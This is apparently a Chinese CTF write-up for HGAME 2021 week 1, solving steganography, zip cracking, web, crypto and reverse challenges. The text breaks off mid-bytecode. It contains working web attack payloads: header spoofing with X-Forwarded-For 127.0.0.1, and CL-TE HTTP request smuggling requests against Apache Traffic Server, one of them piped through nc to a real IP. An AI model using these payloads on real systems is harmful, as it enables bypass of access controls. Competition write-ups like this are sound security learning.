picture ID (Up to 8 digits) 盲猜是 P站某张图片的ID，不过这里懒了，直接爆破好了。 得到密码为 70415155 解压得到 NO PASSWORD.txt Sometimes we don't need to care about password. Because it's too strong or null. XD By the way, I only use storage. 以及一个 plain.zip 明文攻击啦。 注意要先把 NO PASSWORD.txt 打包成压缩包，但是不压缩。 C8uvP$DP 得到 flag.zip，伪加密。 其实不改也行，没加密的情况下文件名后面这段就是明文的。 &amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D; HTML 实体 hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d} Galaxy下载下来流量包，提取下得到一张图。 （噢，出题人在百度搜图啊 没看到有拼接隐写，但是经典套路，改高度就好了。 hgame{Wh4t_A_W0nderfu1_Wa11paper} Word RE:MASTER草，这张图有毒…… first.docx 藏了一个 password.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt; &lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;/password&gt; Brainfuck 跑一跑 （这个工具 可视化挺好的 DOYOUKNOWHIDDEN? 拿去开 maimai.docx 里面有张图片 噢不对，下面还有隐藏文字。 这首歌叫 好き！雪！本気マジック（卧槽！下雪了！牛逼啊） 可以来听一听 =&gt; 网易云， QQ 音乐，还挺不错的。 （当然评论也没啥东西 Tab 和 空格 交错的，是下面这一段，盲猜是零宽字符隐写，但不是零宽字符。 试着把 tab 当作1，空格当作0 s = \"\"\"...\"\"\" print(len(s)) x = '' for i in s: if i == '\\x09': # Tab x += '0' elif i == '\\x20': # Space x += '1' print(x) # 0101101111111011011111011111011101110110111101111011110111011111110110 print(x[::-1]) # 0110111111101110111101111011110110111011101111101111101101111111011010 再转 ASCII，发现明显不对。 然后再看图，下雪了，查一下，发现果然有种空白字符的隐写方式 叫 SNOW。 先是看到了 雪-空白隐写术（2013） 这篇介绍。 然后找到官网 The SNOW Home Page Whitespace steganography ​ The program SNOW is used to conceal messages in ASCII text by appending whitespace to the end of lines. Because spaces and tabs are generally not visible in text viewers, the message is effectively hidden from casual observers. And if the built-in encryption is used, the message cannot be read even if it is detected. 这个加密 2013 年基于 Apache 2.0 协议可用 看了看文档，巨古老（ $ SNOW.exe -C text.txt hgame{Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX} Extensive Reading: BTW，零宽字符隐写的 Ga1@xy 师傅的 浅谈基于零宽度字符的隐写方式 misc学习笔记1-txt零宽度字符隐写 Some online tools: zero-width-lib zwsp-steg-js Unicode Steganography with Zero-Width Characters WebHitchhiking_in_the_Galaxy 第一次在银河系里搭顺风车，要准备啥，在线等，挺急的 http://5f517db502.hitchhiker42.0727.site:42420 访问提示 搭个顺风车，访问 /HitchhikerGuide.php，发现302到主页 index.php 了。 改成 POST。 然后一系列的套路啦。 ​ 只有使用”无限非概率引擎”(Infinite Improbability Drive)才能访问这里～ ​ 你知道吗？茄子特别要求：你得从他的Cardinal过来 ​ flag仅能通过本地访问获得 最后的 payload 如下。 POST /HitchhikerGuide.php HTTP/1.1 Host: 5f517db502.hitchhiker42.0727.site:42420 User-Agent: Infinite Improbability Drive Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://cardinal.ink/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Origin: http://5f517db502.hitchhiker42.0727.site:42420 Content-Length: 0 X-Forwarded-For: 127.0.0.1 hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!} watermelonhttp://watermelon.ryen.xyz:800/ 噢，合成大西瓜啊，其实先是玩了挺久甚至有点上瘾（大雾 看到失败了会提示 “达到两千分就可以得到flag”。 下面开始解题，看了看 network，巨多文件，不过有用的并不多，大部分是图片音频什么的。 先全局搜了一下，没找到 flag，hgame 也没有。 关键的部分包括 index.html、配置 settings.js、 project.js、还有广告 ads.js（他注释掉了 随意看了一下发现打包的有点好，手解不方便，console 调试也比较麻烦。 心想着出题人应该是直接魔改的源码，然后去找源码了。 在 GitHub 上找到了 原版和魔改版的源码 repo https://github.com/xiaopengand/daxigua 再比对一下，找到了可以的部分了。 其实全局搜 gameover 也能找到，233. hgame{do_you_know_cocos_game?} 其实直接 base64 解密一下也行。 （噢，cocos 游戏引擎啊 智商检测鸡 又有谁不爱高数呢？反正我不爱（请使用firefox浏览器打开题目） http://r4u.top:5000/ 又是 积分高数题啊，想起了 USTC Hackergame 那道 超基础的数理模拟器…… 不过这个简单，积分式全部为ax+b的形式，直接匹配直接算就好了，都不需要和 Mathematica 联动。 相关的 API 在 http://r4u.top:5000/static/js/fuckmath.js function getStatus(){ $.ajax({ type:\"GET\", url: \"/api/getStatus\", dataType:\"json\", success:function(data){ let solving = data['solving'] $(\"#status\").text(solving); if(solving === 100) getFlag(); } }); } function getQuestion(){ $.ajax({ type: \"GET\", url: \"/api/getQuestion\", dataType: \"json\", xhrFields: { withCredentials: true }, crossDomain: true, success:function(data){ $('#integral').html(data['question']); } }); } function getFlag(){ $.ajax({ type: \"GET\", url: \"/api/getFlag\", dataType: \"json\", success:function(data){ $('#flag').html(data['flag']); } }); } function init(){ getQuestion(); getStatus(); } function submit(){ $.ajax({ type: \"POST\", url: \"/api/verify\", data: JSON.stringify({answer:parseFloat($('#answer').val())}), dataType: \"json\", contentType: \"application/json;charset=utf-8\", xhrFields: { withCredentials: true }, crossDomain: true, success: function(data) { console.log(data); if (data['result'] === true) { init(); $('#alert').html(` &lt;div class=\"alert alert-success\"&gt;\\n &lt;strong&gt;Right!&lt;/strong&gt;\\n &lt;/div&gt;`) } else { $('#alert').html(` &lt;div class=\"alert alert-danger\"&gt;\\n &lt;strong&gt;Wrong!&lt;/strong&gt;\\n &lt;/div&gt;`) } } }); } 返回的公式格式为 &lt;math&gt; &lt;mrow&gt; &lt;msubsup&gt; &lt;mo&gt;\\u222b&lt;/mo&gt; &lt;mrow&gt; &lt;mo&gt;-&lt;/mo&gt; &lt;mn&gt;92&lt;/mn&gt; &lt;/mrow&gt; &lt;mrow&gt; &lt;mn&gt;31&lt;/mn&gt; &lt;/mrow&gt; &lt;/msubsup&gt; &lt;mo&gt;(&lt;/mo&gt; &lt;mn&gt;12&lt;/mn&gt; &lt;mi&gt;x&lt;/mi&gt; &lt;mo&gt;+&lt;/mo&gt; &lt;mn&gt;17&lt;/mn&gt; &lt;mo&gt;)&lt;/mo&gt; &lt;mtext&gt; &lt;mi&gt;d&lt;/mi&gt; &lt;/mtext&gt; &lt;mi&gt;x&lt;/mi&gt; &lt;mtd /&gt; &lt;/mrow&gt; &lt;/math&gt; 然后写脚本就好了。 # -*- coding: utf-8 -*- \"\"\" Hgame Week1 Web 智商检测鸡 http://r4u.top:5000/ @Author: MiaoTony @Time: 20210201 \"\"\" import requests import re from bs4 import BeautifulSoup host = \"http://r4u.top:5000\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\" } s = requests.Session() s.headers = headers def getInfo(url): r = s.get(url) r.encoding = 'utf-8' return r.json() def getStatus(): url = host + \"/api/getStatus\" r = getInfo(url) solving = r.get(\"solving\") print(\"---\", solving, \"---\") return solving def getFlag(): url = host + \"/api/getFlag\" r = getInfo(url) print(\"====&gt;\", r) def getQuestion(): url = host + \"/api/getQuestion\" r = getInfo(url) question = r.get(\"question\") print(\"====&gt;\", question) return question def submit(answer): url = host + \"/api/verify\" payload = {'answer': answer} r = s.post(url, json=payload).json() result = r.get(\"result\") print(\"&lt;====\", result) def solve(q): soup = BeautifulSoup(q, 'lxml') sub, sup = list(map(lambda x: int(x.text), soup.select('msubsup &gt; mrow'))) f = soup.select('math &gt; mrow')[0].text x = re.findall(r'\\((-?\\d+)x\\+(\\d+)\\)', f)[0] a, b = [int(i) for i in x] # a/2 x**2 + b x answer = a/2*(sup**2-sub**2) + b*(sup-sub) answer = round(answer, 2) print(answer) submit(answer) def main(): status = 0 while status &lt; 100: q = getQuestion() solve(q) status = getStatus() print() if status == 100: getFlag() if __name__ == \"__main__\": main() 然后就是愉快的解题环节，最后拿到 flag。 hgame{3very0ne_H4tes_Math} 宝藏走私者 hint: 注意留意服务器信息 资料：https://paper.seebug.org/1048/ 宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。 为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。 调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。 这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？ Challenge Address: http://thief.0727.site:80 HTTP 走私，第一次听说这个概念喵。 Apache Traffic Server 看一下服务器，ATS/7.1.2，在漏洞的版本范围内，还正好和文中的一样。 直接访问 /secret 会提示 Client-IP NOT FOUND IN HEADERS!。 估计就是 ATS 传到后面的 Nginx 的时候，没有带上 Client-IP，但是如果手动给定 Client-IP 则会返回真实的 IP 而不是自己设置的。 参考 https://paper.seebug.org/1048/#433，这个第三个补丁。 https://github.com/apache/trafficserver/pull/3231 # 3231 验证请求中的Content-Length头 试了试 CL-TE走私攻击。 夹带请求一下 / 看看，果然能够返回主页。 然后带上攻击的 Client-IP 试试，拿到 flag。 payload: GET /secret HTTP/1.1 Host: police.liki.link Content-Length: 49 Transfer-Encoding: chunked 0 GET /secret HTTP/1.1 Client-IP: 127.0.0.1 就是说当 ATS 把这一个 GET 请求交给 Nginx 的时候，后面的 Nginx 认为这是两个 GET 请求，于是当 GET /secret HTTP/1.1 Client-IP: 127.0.0.1 这一部分到 Nginx 的时候，就能伪造本地了。 hgame{HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!} 走私者的愤怒 本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者Liki 日记：2020年2月2日：今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话“我最讨厌顺风车，我将带来我的愤怒”真是让人摸不着头脑……我看不懂，但我大受震撼。 Challenge Address: http://police.liki.link 和上面那题不同，这个直接访问就给出了 Client-IP。 但是 payload 其实是一样的。 不过在 Burp Suite 不一定能出来，他基本上是只显示了第一个返回的 response，emmm 感觉是 burp 设计上的问题。 但是直接在 nc 里执行就好了啦。 printf 'GET /secret HTTP/1.1\\r\\n''Host: police.liki.link\\r\\n''Content-Length: 49\\r\\n''Transfer-Encoding: chunked\\r\\n''\\r\\n''0\\r\\n''\\r\\n''GET /secret HTTP/1.1\\r\\n''Host: police.liki.link\\r\\n''Client-IP: 127.0.0.1\\r\\n''\\r\\n'| nc 42.193.143.243 80 很明显能看到返回了两个响应，多发几次就能在第二个返回里看到 flag 了。 hgame{Fe3l^tHe~4N9eR+oF_5mu9gl3r!!} 看了官方 WP，原来这题中间多套了一层 Nginx，架构是 ATS -&gt; Nginx -&gt; LNMP，而前面那题是 ATS -&gt; LNMP。 Cryptoまひと hint: flag的格式为hgame{xxx}（重要） 大家好，我叫真人，来自咒术回战，你也可以叫我，缝合怪！！ ---../-..../-..-./.----/-----/----./-..-./.----/-----/---../-..-./.----/.----/-----/-..-./----./-----/-..-./---../--.../-..-./...../...--/-..-./.----/-----/---../-..-./----./----./-..-./.----/-----/----./-..-./---../...../-..-./.----/.----/-..../-..-./---../....-/-..-./--.../.----/-..-./.----/-----/---../-..-./.----/.----/....-/-..-./----./--.../-..-./---../....-/-..-./.----/.----/..---/-..-./...../--.../-..-./---../-..../-..-./.----/-----/----./-..-./.----/.----/-..../-..-./.----/.----/-..../-..-./.----/-----/-----/-..-./.----/-----/--.../-..-./.----/.----/..---/-..-./.----/-----/...../-..-./--.../...--/-..-./---../....-/-..-./--.../-----/-..-./---../----./-..-./.----/-----/-----/-..-./-..../----./-..-./--.../-----/-..-./...../..---/-..-./----./-----/-..-./---../...--/-..-./--.../-----/-..-./.----/.----/.----/-..-./----./----./-..-./-..../----./-..-./....-/---../-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./....-/---../-..-./....-/---../-..-./.----/.----/....-/-..-./--.../----./-..-./---../---../-..-./.----/-----/....-/-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./.----/.----/-----/-..-./--.../....-/-..-./---../...../-..-./---../....-/-..-./---../-..../-..-./...../--.../-..-./--.../----./-..-./----./--.../-..-./.----/.----/-----/-..-./...../...--/-..-./.----/-----/-..../-..-./---../...../-..-./.----/-----/----./-..-./----./----./-..-./....-/---../-..-./.----/-----/.----/-..-./-..../...../-..-./-..../.----/-..-./-..../.---- Morse code 86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61 然后 chr，base64 import base64 s = \"86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61\" l = s.split('/') r = '' for i in l: x = chr(int(i)) print(x) r += x print(r) # VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA== r2 = base64.b64decode(r) print(r2) # b'Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x' Vigenere 解密得到 }KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n 看上去像是逆序了的 n4yGu~zF_BLhrfp9+C{1Eez!upPlN1!tYnccK} 看样子又不像。里面都没有 hgame，又试了试栅栏，这不对劲啊。 看了官方 WP 后，这6个栅栏就离谱！ 太奇怪了！！！ }KccnYt !1NlPpu !zeE1{ C+9pfr hLB_Fz ~uGy4n =====&gt; }!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu 然后逆序 utnzr{pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!} 凯撒 / ROT13 hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!} 对称之美 美术大师 Liki 总说，对称是世界上最美的结构… 源码： import random import string import itertools from secret import FLAG key = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) cipher = bytes([ord(m)^ord(k) for m, k in zip(FLAG, itertools.cycle(key))]) print(cipher) #cipher=b'&gt;\\tA+/\\x01@\"\\x08T\\x1a\\x1a\\x17\\x05\\x07\\x11\\x143Kf5\\x0cQ&gt;Q\\x00\\x1b\\x11\\x17\\x01\\x19\\x00Y?V21D[6Q~\\x12TG\\x05\\x1c\\x0b@3V!b\\x0bFp\\x15\\x06\\x12\\x03^\\n\\x12EV;T\\',\\x07Qp\\x14\\x15\\x10\\x1c\\x17\\x0b\\x01\\rQ(\\x18L-\\x11@~Q \\x1b\\x1dDD\\x16\\nA6\\\\f \\x01\\x14$\\x19\\x11S\\x1bU\\x0e\\x10\\x06@)\\x182*\\x01Y#\\x14\\x18\\x05\\x11DHUoV/Lf+\\x10\\x143\\x10\\x1aS\\x15[\\x17\\x1aEF?T\\'6\\x01\\x14$\\x1eT\\x10\\x1b[\\x0b\\x07\\x16\\x14;V\"bn[$\\x19\\x11\\x01TT\\x0b\\x18\\x15[)Q2+\\x0bZ1\\x1dT\\x07\\x11T\\x0c\\x1b\\x0cE/]5lnm?\\x04T\\x1e\\x15ND\\x1b\\n@zJ##\\x08]*\\x14T\\x1a\\x00\\x1bD\\x17\\x10@zA)7\\x16\\x142\\x03\\x15\\x1a\\x1a\\x17n\\x1c\\x16\\x148M5;DC?\\x03\\x1f\\x1a\\x1aPD\\x17\\x00\\\\3V\"b\\x10\\\\5Q\\x07\\x10\\x11Y\\x01\\x06E@5\\x185\\'\\x01_p{\\x1b\\x06\\x00\\x17\\x17\\x0c\\x08Y?L4;DC8\\x14\\x1aS\\rX\\x11U\\t[5Sf#\\x10\\x141Q\\x04\\x12\\x1dY\\x10\\x1c\\x0bSt\\x18L\\x16\\x0cQ\"\\x14T\\x12\\x06RD\\x06\\x00B?J\\'.DF5\\x10\\x07\\x1c\\x1aDD\\x13\\nFzL.+\\x17\\x1ap%\\x1c\\x16T=\\x02\\x1c\\x17G.\\x18/1D@8\\x10\\x00S\\x03RC\\x07\\x00\\x142Y4&amp;IC9\\x03\\x11\\x17TC\\x0bU\\t[5Sf$\\x0bFp{\\x1d\\x07Z\\x17+\\x00\\x17\\x14;V%+\\x01Z$Q\\x15\\x1d\\x17R\\x17\\x01\\nF)\\x18+#\\x1d\\x14&gt;\\x1e\\x00S\\x1cV\\x12\\x10E\\\\;\\\\fH\\x05\\x14&gt;\\x10\\x19\\x16TQ\\x0b\\x07E].\\x14f \\x11@p\\x05\\x1c\\x16\\r\\x17\\x0f\\x1b\\x00CzL.#\\x10\\x14$\\x19\\x11\\x1a\\x06\\x17n\\x1a\\x12ZzZ)&amp;\\rQ#Q\\x03\\x16\\x06RD\\x17\\x04G3[\\'.\\x08Mp\\x02\\r\\x1e\\x19R\\x10\\x07\\x0cW;Tjb\\x05Gp{\\x03\\x16\\x06RD\\x01\\r[)]f-\\x02\\x14 \\x1e\\x00\\x16\\x1aC\\r\\x14\\t\\x14*J#&amp;\\x05@?\\x03\\x07S\\x1bED\\x05\\x17Q#\\x16fH0\\\\5\\x03\\x11\\x15\\x1bE\\x01YE@2Q5b\\x07U=\\x14T\\x1a\\x1a\\x17\\x0c\\x14\\x0bP#\\x181*\\x01@8\\x14\\x06S~T\\x0c\\x1a\\nG3V!b\\x05\\x14=\\x10\\x00\\x16X\\x17\\x07\\x14\\x11W2Q(%DP9\\x1f\\x1a\\x16\\x06\\x17\\x0b\\x07E&gt;;N)+\\x00]&gt;\\x16T\\x11\\x11^\\n\\x12E[4\\x182*\\x01\\x14=\\x14\\x1a\\x06TX\\x02U\\x04\\x14)V\\'0\\x08]&gt;\\x16XS~_\\x11\\x1b\\x02F#\\x186#\\x07_p\\x1e\\x12S\\x03X\\x08\\x03\\x00GzW4b\\x06Q1\\x03\\x07R~c\\x05\\x1e\\x00\\x14;\\x18*-\\x0b_p\\x10\\x00S\\rX\\x11\\x07ER;[#b\\rZp\\x05\\x1c\\x16TZ\\r\\x07\\x17[(\\x18L#\\nPp\\x18\\x19\\x12\\x13^\\n\\x10EUzT/,\\x01\\x14#\\x05\\x06\\x12\\x1dP\\x0c\\x01EP5O(b\\x10\\\\5Q~\\x1e\\x1dS\\x00\\x19\\x00\\x1aza)7CX&lt;Q\\x07\\x16\\x11\\x17\\x06\\x1a\\x11\\\\zK/&amp;\\x01Gp\\x1e\\x12S\\rX\\x11\\x07E&gt;&lt;Y%\\'DU\"\\x14T\\x03\\x06R\\x10\\x01\\x1c\\x14)A+/\\x01@\"\\x18\\x17\\x12\\x18\\x19D!\\r])\\x18/1D&gt;;\\x1f\\x1b\\x04\\x1a\\x17\\x05\\x06EV3T\\'6\\x01F1\\x1dT\\x00\\rZ\\t\\x10\\x11F#\\x18\\',\\x00\\x149\\x05S\\x00T=\\x13\\x1d\\x00F?\\x18$-\\x10\\\\p\\x02\\x1d\\x17\\x11DD\\x10\\x0c@2]4b\\x17]4\\x14T\\x1c\\x12\\x17\\x10\\x1d\\x0cGz2\"+\\x12]4\\x18\\x1a\\x14T[\\r\\x1b\\x00\\x14;H6\\'\\x05Fp\\x1c\\x1b\\x01\\x11\\x17\\x0b\\x07EX?K5b\\x10\\\\5Q\\x07\\x12\\x19RJ\\x7f6[zP#0\\x01\\x149\\x02T\\x07\\x1cRD\\x13\\tU=\\x02fH\\x0cS1\\x1c\\x11\\x08,\\x07\\x16*\\x0c\\x01wY\\x1977\\x076$EX@Y\\x00Q\\x03a\\x14V?\\x1d\\'\\x05 9G\\x01\\t=' 利用 xortool，可以帮助得到这个加密使用的 key。 xortool.py xortool A tool to do some xor analysis: - guess the key length (based on count of equal chars) - guess the key (base on knowledge of most frequent char) Usage: xortool [-x] [-m MAX-LEN] [-f] [-t CHARSET] [FILE] xortool [-x] [-l LEN] [-c CHAR | -b | -o] [-f] [-t CHARSET] [-p PLAIN] [FILE] xortool [-x] [-m MAX-LEN| -l LEN] [-c CHAR | -b | -o] [-f] [-t CHARSET] [-p PLAIN] [FILE] xortool [-h | --help] xortool --version Options: -x --hex input is hex-encoded str -l LEN, --key-length=LEN length of the key -m MAX-LEN, --max-keylen=MAX-LEN maximum key length to probe [default: 65] -c CHAR, --char=CHAR most frequent char (one char or hex code) -b --brute-chars brute force all possible most frequent chars -o --brute-printable same as -b but will only check printable chars -f --filter-output filter outputs based on the charset -t CHARSET --text-charset=CHARSET target text character set [default: printable] -p PLAIN --known-plaintext=PLAIN use known plaintext for decoding -h --help show this help 由于它的 FILE 输入需要的是 binary 或者 hex 或者 plain text，而这里的 cipher 是 Python 里的字符串，所以先转换成 hex。 cipher = 'xxxxxx' print(cipher.hex()) 然后把这个 hex 保存到文件，比如 cipher.txt. 试了一下，指定 -l 16 倒没作用，-p \"hgame{\" 甚至会报错。最后还是用下面这个好了。 $ xortool -x -c 20 cipher.txt The most probable key lengths: 2: 10.3% 4: 10.9% 6: 9.3% 8: 15.0% 10: 7.7% 12: 8.5% 14: 7.4% 16: 15.5% 32: 7.8% Key-length can be 4*n 2 possible key(s) of length 16: 4Z8FB!4Pqtst7d'e 4Z8FB!4P4tst7d'e Found 2 plaintexts with 95%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv 看一看输出的文件，已经很有味道了，flag 都很明显了。 根据出来的 key 4Z8FB!4Pqtst7d'e，有两个不在 string.ascii_letters + string.digits 范围内的字符，于是考虑爆破一下找真正的 key。 import string keys = string.ascii_letters + string.digits cipher = 'xxxxxxxx' # 4Z8FB!4Pqtst7d'e for i in keys: key = \"4Z8FB\" + i + \"4Pqtst7due\" r = '' for idx, value in enumerate(cipher): x = chr(value ^ ord(key[idx % 16])) r += x print('====' + i + '====') # print(r) if 'hgame' in r: print(r) 两个位置都试一试，最后看哪个最合理。 最后得出是 4Z8FBd4Pqtst7due Symmetry in art is when the elements of a painting or drawing balance each other out. This could be the objects themselves, but it can also relate to colors and other compositional techniques. You may not realize it, but your brain is busy working behind the scenes to seek out symmetry when you look at a painting. There are several reasons for this. The first is that we're hard-wired to look for it. Our ancient ancestors may not have had a name for it, but they knew that their own bodies were basically symmetrical, as were those of potential predators or prey. Therefore, this came in handy whether choosing a mate, catching dinner or avoiding being on the menu of a snarling, hungry pack of wolves or bears! Take a look at your face in the mirror and imagine a line straight down the middle. You'll see both sides of your face are pretty symmetrical. This is known as bilateral symmetry and it's where both sides either side of this dividing line appear more or less the same. So here is the flag: hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r} 然后发现这个居然真的有原文，就是 对称之美（Symmetry in Art），详见 5 Reasons Why We Love Symmetry in Art so Much (And How You Can Use This Research to Create Even More Awesome Paintings) Transformer 所有人都已做好准备,月黑之时即将来临,为了击毁最后的主控能量柱,打开通往芝加哥的升降桥迫在眉睫 看守升降桥的控制员已经失踪,唯有在控制台的小房间留下来的小纸条,似乎是控制员防止自己老了把密码忘记而写下的,但似乎都是奇怪的字母组合,唯一有价值的线索是垃圾桶里的两堆被碎纸机粉碎的碎纸,随便查看几张,似乎是两份文件,并且其中一份和小纸条上的字母规律有点相像 附件md5:0340142700c8f63546368fa14fd6fb24 https://1.oss.hgame2021.vidar.club/Transformer.zip \\ Transformer.txt: Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk \"qypth{hp5d_s0n_szi^3ic&amp;qh11a_}\",Dai'o sanyho oa pcc oqh dhpn po oqh hic. 很明显这个就是密文了，flag 就藏在这个里面了。 然后给了 ori 和 enc，原文和密文，随意看了一下还打乱顺序了，坏耶。 不过问题不大，发现是对称加密，而且只是小写字母进行了对换，其他字符都不变。 那直接找足够多的样本，得到映射关系就完事了。 payload 有点乱，大概思路首先是找几个样本，然后根据样本得到匹配对 pair，最后解密。 import os import string os.chdir(os.path.dirname(os.path.realpath(__file__))) # base_dir = \"enc/\" base_dir = \"ori/\" filenames = os.listdir(base_dir) for filename in filenames: with open(base_dir + filename, 'r', encoding='utf-8') as f: content = f.read() # if \"’\" in content: # if 'b' in content and 'l' in content: if content[5] == ' ': print(filename) print(content) print('=====') ori1 = \"\"\"hat you want but it will be “correct”. anotrogram correctness” and many gstance. rust offers a form of “p me; we don’t have to worry about the from runtime checking of constraints and invariants; mpile times to be pretty beefy; our cpus a memory safety; it definitely excites us kno duction for the last few years and we’ve if you’re new to rust, start small and build started this project. we’ve bee ntial localization implementation to meet the require \"\"\" enc1 = \"\"\"qpo daz rpio mzo fo rfuu mh “eannheo”. piaonaynpt eannheoihkk” pic tpid ykopieh. nzko asshnk p sant as “x th; rh cai’o qpvh oa rannd pmazo oqh snat nziofth eqhejfiy as eaikonpfiok pic fivpnfpiok; txfuh ofthk oa mh xnhood mhhsd; azn exzk p thtand kpshod; fo chsfifohud hgefohk zk jia czeofai san oqh upko shr dhpnk pic rh’vh fs daz’nh ihr oa nzko, kopno ktpuu pic mzfuc kopnohc oqfk xnawheo. rh’vh mhh iofpu uaepufbpofai ftxuhthiopofai oa thho oqh nhlzfnh \"\"\" pair = {} for idx, value in enumerate(enc1): pair[value] = ori1[idx] print(pair) # {'q': 'h', 'p': 'a', 'o': 't', ' ': ' ', 'd': 'y', 'a': 'o', 'z': 'u', 'r': 'w', 'i': 'n', 'm': 'b', 'f': 'i', 'u': 'l', 'h': 'e', '“': '“', 'e': 'c', 'n': 'r', '”': '”', '.': '.', '\\n': '\\n', 'y': 'g', 't': 'm', 'k': 's', 'c': 'd', 's': 'f', 'x': 'p', ';': ';', '’': '’', 'v': 'v', 'j': 'k', 'g': 'x', ',': ',', 'w': 'j', 'b': 'z', 'l': 'q'} s=\"\"\"Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk \"qypth{hp5d_s0n_szi^3ic&amp;qh11a_}\",Dai'o sanyho oa pcc oqh dhpn po oqh hic.\"\"\" r = '' for i in s: if i in string.ascii_lowercase: r += pair[i] else: r += i # print(r) print(r) # The lift bridge console system has only used password login since 2003, the password is \"hgame{ea5y_f0r_fun^3nd&amp;he11o_}\",Don't forget to add the year at the end. 最后再加上年份 hgame{ea5y_f0r_fun^3nd&amp;he11o_2021} Reversepypy给了 dis.dis human readable 的字节码，直接逆向一下就完事了。 4 0 LOAD_GLOBAL 0 (input) 2 LOAD_CONST 1 ('give me your flag:\\n') 4 CALL_FUNCTION 1 6 STORE_FAST 0 (raw_flag) 5 8 LOAD_GLOBAL 1 (list) 10 LOAD_FAST 0 (raw_flag) 12 LOAD_CONST 2 (6) 14 LOAD_CONST 3 (-1) 16 BUILD_SLICE 2 18 BINARY_SUBSCR 20 CALL_FUNCTION 1 22 STORE_FAST 1 (cipher) 6 24 LOAD_GLOBAL 2 (len) 26 LOAD_FAST 1 (cipher) 28 CALL_FUNCTION 1 30 STORE_FAST 2 (length) 8 32 LOAD_GLOBAL 3 (range) 34 LOAD_FAST 2 (length) 36 LOAD_CONST 4 (2) 38 BINARY_FLOOR_DIVIDE 40 CALL_FUNCTION 1 42 GET_ITER &gt;&gt; 44 FOR_ITER 54 (to 100) 46 STORE_FAST 3 (i) 9 48 LOAD_FAST 1 (cipher) 50 LOAD_CONST 4 (2) 52 LOAD_FAST 3 (i) 54 BINARY_MULTIPLY 56 LOAD_CONST 5 (1) 58 BINARY_ADD 60 BINARY_SUBSCR 62 LOAD_FAST 1 (cipher) 64 LOAD_CONST 4 (2) 66 LOAD_FAST 3 (i) 68 BINARY_MULTIPLY 70 BINARY_SUBSCR 72 ROT_TWO 74 LOAD_FAST 1 (cipher) 76 LOAD_CONST 4 (2) 78 LOAD_FAST 3 (i) 80 BINARY_MULTIPLY 82 STORE_SUBSCR 84 LOAD_FAST 1 (cipher) 86 LOAD_CONST 4 (2) 88 LOAD_FAST 3 (i) 90 BINARY_MULTIPLY 92 LOAD_CONST 5 (1) 94 BINARY_ADD 96 STORE_SUBSCR 98 JUMP_ABSOLUTE 44 12 &gt;&gt; 100 BUILD_LIST 0 102 STORE_FAST 4 (res) 13 104 LOAD_GLOBAL 3 (range) 106 LOAD_FAST 2 (length) 108 CALL_FUNCTION 1 110 GET_ITER &gt;&gt; 112 FOR_ITER 26 (to 140) 114 STORE_FAST 3 (i) 14 116 LOAD_FAST 4 (res) 118 LOAD_METHOD 4 (append) 120 LOAD_GLOBAL 5 (ord) 122 